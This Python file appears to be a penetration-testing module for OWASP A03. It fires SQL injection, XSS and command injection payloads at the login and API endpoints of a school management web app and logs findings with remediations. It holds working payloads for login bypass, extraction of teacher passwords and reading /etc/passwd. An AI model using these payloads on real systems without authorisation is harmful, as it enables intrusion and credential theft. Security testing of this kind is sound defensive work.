"""
Injection Vulnerability Testing (OWASP A03)
Comprehensive testing for SQL Injection, XSS, Command Injection, and other injection flaws
"""

import requests
import time
import re
from urllib.parse import urljoin, quote
import html

class InjectionTester:
    """Test for various injection vulnerabilities."""
    
    def __init__(self, base_url, session):
        self.base_url = base_url
        self.session = session
        self.vulnerabilities = []
    
    def log_vulnerability(self, severity, title, description, evidence="", remediation=""):
        """Log injection vulnerability."""
        vuln = {
            'category': 'A03 - Injection',
            'severity': severity,
            'title': title,
            'description': description,
            'evidence': evidence,
            'remediation': remediation
        }
        self.vulnerabilities.append(vuln)
        print(f"🚨 {severity}: {title}")
        print(f"   Evidence: {evidence}")
        print()
    
    def test_sql_injection_comprehensive(self):
        """Comprehensive SQL injection testing."""
        print("\n🔍 COMPREHENSIVE SQL INJECTION TESTING")
        print("-" * 50)
        
        # SQL injection payloads
        sql_payloads = [
            # Basic SQL injection
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            
            # Union-based injection
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT NULL,username,password,NULL,NULL FROM teacher--",
            "' UNION SELECT table_name,NULL,NULL,NULL,NULL FROM information_schema.tables--",
            
            # Boolean-based blind injection
            "' AND (SELECT COUNT(*) FROM teacher)>0--",
            "' AND (SELECT SUBSTRING(username,1,1) FROM teacher LIMIT 1)='a'--",
            
            # Time-based blind injection
            "' AND (SELECT SLEEP(5))--",
            "'; WAITFOR DELAY '00:00:05'--",
            
            # Error-based injection
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
        ]
        
        # Test endpoints that might be vulnerable
        test_endpoints = [
            # Authentication endpoints
            {'url': '/admin_login', 'method': 'POST', 'params': {'username': 'PAYLOAD', 'password': 'test'}},
            {'url': '/teacher_login', 'method': 'POST', 'params': {'username': 'PAYLOAD', 'password': 'test'}},
            {'url': '/classteacher_login', 'method': 'POST', 'params': {'username': 'PAYLOAD', 'password': 'test'}},
            
            # Search/filter endpoints (if they exist)
            {'url': '/search', 'method': 'GET', 'params': {'q': 'PAYLOAD'}},
            {'url': '/api/students', 'method': 'GET', 'params': {'search': 'PAYLOAD'}},
            {'url': '/api/teachers', 'method': 'GET', 'params': {'filter': 'PAYLOAD'}},
        ]
        
        for endpoint in test_endpoints:
            for payload in sql_payloads:
                self.test_sql_injection_endpoint(endpoint, payload)
    
    def test_sql_injection_endpoint(self, endpoint, payload):
        """Test specific endpoint for SQL injection."""
        try:
            # Replace PAYLOAD with actual payload
            params = {}
            for key, value in endpoint['params'].items():
                params[key] = value.replace('PAYLOAD', payload) if 'PAYLOAD' in str(value) else value
            
            start_time = time.time()
            
            if endpoint['method'] == 'POST':
                response = self.session.post(
                    urljoin(self.base_url, endpoint['url']),
                    data=params,
                    timeout=10
                )
            else:
                response = self.session.get(
                    urljoin(self.base_url, endpoint['url']),
                    params=params,
                    timeout=10
                )
            
            end_time = time.time()
            response_time = end_time - start_time
            
            # Check for SQL error messages
            sql_errors = [
                'mysql_fetch_array',
                'mysql_num_rows',
                'mysql_error',
                'pymysql.err',
                'sqlalchemy.exc',
                'OperationalError',
                'ProgrammingError',
                'syntax error',
                'mysql server version',
                'table doesn\'t exist',
                'column doesn\'t exist',
                'duplicate entry',
                'access denied for user'
            ]
            
            response_text = response.text.lower()
            for error in sql_errors:
                if error.lower() in response_text:
                    self.log_vulnerability(
                        'CRITICAL',
                        f'SQL Injection in {endpoint["url"]}',
                        'SQL error messages exposed, indicating potential SQL injection vulnerability',
                        f'Payload: {payload}, Error: {error}',
                        'Use parameterized queries and proper error handling'
                    )
                    return
            
            # Check for time-based injection (if response took significantly longer)
            if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
                if response_time > 4:  # Expecting 5-second delay
                    self.log_vulnerability(
                        'CRITICAL',
                        f'Time-based SQL Injection in {endpoint["url"]}',
                        'Response time indicates successful time-based SQL injection',
                        f'Payload: {payload}, Response time: {response_time:.2f}s',
                        'Use parameterized queries and input validation'
                    )
                    return
            
            # Check for successful authentication bypass
            if endpoint['url'].endswith('_login') and response.status_code == 302:
                location = response.headers.get('Location', '')
                if 'dashboard' in location or 'admin' in location:
                    self.log_vulnerability(
                        'CRITICAL',
                        f'Authentication Bypass in {endpoint["url"]}',
                        'SQL injection payload resulted in successful authentication bypass',
                        f'Payload: {payload}, Redirected to: {location}',
                        'Implement proper authentication and parameterized queries'
                    )
                    return
        
        except requests.exceptions.Timeout:
            if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
                self.log_vulnerability(
                    'CRITICAL',
                    f'Time-based SQL Injection in {endpoint["url"]}',
                    'Request timeout indicates successful time-based SQL injection',
                    f'Payload: {payload}, Request timed out',
                    'Use parameterized queries and input validation'
                )
        except Exception as e:
            # Ignore connection errors for non-existent endpoints
            pass
    
    def test_xss_vulnerabilities(self):
        """Test for Cross-Site Scripting (XSS) vulnerabilities."""
        print("\n🔍 CROSS-SITE SCRIPTING (XSS) TESTING")
        print("-" * 50)
        
        xss_payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            
            # Event-based XSS
            "javascript:alert('XSS')",
            "onmouseover=alert('XSS')",
            "onfocus=alert('XSS') autofocus",
            
            # Encoded XSS
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            
            # Filter bypass attempts
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<iframe src=javascript:alert('XSS')></iframe>"
        ]
        
        # Test endpoints that might reflect user input
        test_endpoints = [
            {'url': '/search', 'method': 'GET', 'params': {'q': 'PAYLOAD'}},
            {'url': '/admin_login', 'method': 'POST', 'params': {'username': 'PAYLOAD', 'password': 'test'}},
            {'url': '/teacher_login', 'method': 'POST', 'params': {'username': 'PAYLOAD', 'password': 'test'}},
        ]
        
        for endpoint in test_endpoints:
            for payload in xss_payloads:
                self.test_xss_endpoint(endpoint, payload)
    
    def test_xss_endpoint(self, endpoint, payload):
        """Test specific endpoint for XSS."""
        try:
            # Replace PAYLOAD with actual payload
            params = {}
            for key, value in endpoint['params'].items():
                params[key] = value.replace('PAYLOAD', payload) if 'PAYLOAD' in str(value) else value
            
            if endpoint['method'] == 'POST':
                response = self.session.post(
                    urljoin(self.base_url, endpoint['url']),
                    data=params,
                    timeout=5
                )
            else:
                response = self.session.get(
                    urljoin(self.base_url, endpoint['url']),
                    params=params,
                    timeout=5
                )
            
            # Check if payload is reflected in response without proper encoding
            if payload in response.text:
                # Check if it's properly encoded
                encoded_payload = html.escape(payload)
                if encoded_payload not in response.text:
                    self.log_vulnerability(
                        'HIGH',
                        f'Reflected XSS in {endpoint["url"]}',
                        'User input reflected without proper encoding',
                        f'Payload: {payload}',
                        'Implement proper output encoding and Content Security Policy'
                    )
            
            # Check for script execution indicators in response
            script_indicators = [
                '<script',
                'javascript:',
                'onerror=',
                'onload=',
                'onmouseover='
            ]
            
            response_lower = response.text.lower()
            for indicator in script_indicators:
                if indicator in response_lower and payload.lower() in response_lower:
                    self.log_vulnerability(
                        'HIGH',
                        f'Potential XSS in {endpoint["url"]}',
                        'Script execution indicators found in response',
                        f'Payload: {payload}, Indicator: {indicator}',
                        'Implement proper output encoding and input validation'
                    )
                    break
        
        except Exception as e:
            # Ignore connection errors for non-existent endpoints
            pass
    
    def test_command_injection(self):
        """Test for command injection vulnerabilities."""
        print("\n🔍 COMMAND INJECTION TESTING")
        print("-" * 50)
        
        command_payloads = [
            # Basic command injection
            "; ls",
            "| whoami",
            "&& id",
            "|| pwd",
            
            # Windows commands
            "; dir",
            "| type",
            "&& echo",
            
            # Time-based detection
            "; sleep 5",
            "| ping -c 5 127.0.0.1",
            "&& timeout 5",
            
            # File operations
            "; cat /etc/passwd",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "&& ls -la"
        ]
        
        # Test file upload or system interaction endpoints
        test_endpoints = [
            {'url': '/upload', 'method': 'POST', 'params': {'filename': 'PAYLOAD'}},
            {'url': '/export', 'method': 'GET', 'params': {'format': 'PAYLOAD'}},
            {'url': '/backup', 'method': 'POST', 'params': {'path': 'PAYLOAD'}},
        ]
        
        for endpoint in test_endpoints:
            for payload in command_payloads:
                self.test_command_injection_endpoint(endpoint, payload)
    
    def test_command_injection_endpoint(self, endpoint, payload):
        """Test specific endpoint for command injection."""
        try:
            params = {}
            for key, value in endpoint['params'].items():
                params[key] = value.replace('PAYLOAD', payload) if 'PAYLOAD' in str(value) else value
            
            start_time = time.time()
            
            if endpoint['method'] == 'POST':
                response = self.session.post(
                    urljoin(self.base_url, endpoint['url']),
                    data=params,
                    timeout=10
                )
            else:
                response = self.session.get(
                    urljoin(self.base_url, endpoint['url']),
                    params=params,
                    timeout=10
                )
            
            end_time = time.time()
            response_time = end_time - start_time
            
            # Check for command execution indicators
            command_indicators = [
                'root:',  # /etc/passwd content
                'uid=',   # id command output
                'total ',  # ls -la output
                'volume in drive',  # dir command output
                'ping statistics'  # ping command output
            ]
            
            response_text = response.text.lower()
            for indicator in command_indicators:
                if indicator in response_text:
                    self.log_vulnerability(
                        'CRITICAL',
                        f'Command Injection in {endpoint["url"]}',
                        'Command execution indicators found in response',
                        f'Payload: {payload}, Indicator: {indicator}',
                        'Use input validation and avoid system calls with user input'
                    )
                    return
            
            # Check for time-based injection
            if 'sleep' in payload.lower() or 'ping' in payload.lower() or 'timeout' in payload.lower():
                if response_time > 4:
                    self.log_vulnerability(
                        'CRITICAL',
                        f'Time-based Command Injection in {endpoint["url"]}',
                        'Response time indicates successful command injection',
                        f'Payload: {payload}, Response time: {response_time:.2f}s',
                        'Use input validation and avoid system calls with user input'
                    )
        
        except requests.exceptions.Timeout:
            if 'sleep' in payload.lower() or 'ping' in payload.lower():
                self.log_vulnerability(
                    'CRITICAL',
                    f'Time-based Command Injection in {endpoint["url"]}',
                    'Request timeout indicates successful command injection',
                    f'Payload: {payload}',
                    'Use input validation and avoid system calls with user input'
                )
        except Exception as e:
            pass
    
    def run_all_injection_tests(self):
        """Run all injection vulnerability tests."""
        print("🔍 STARTING INJECTION VULNERABILITY TESTING")
        print("=" * 60)
        
        self.test_sql_injection_comprehensive()
        self.test_xss_vulnerabilities()
        self.test_command_injection()
        
        print(f"\n📊 INJECTION TESTING COMPLETE")
        print(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        
        return self.vulnerabilities
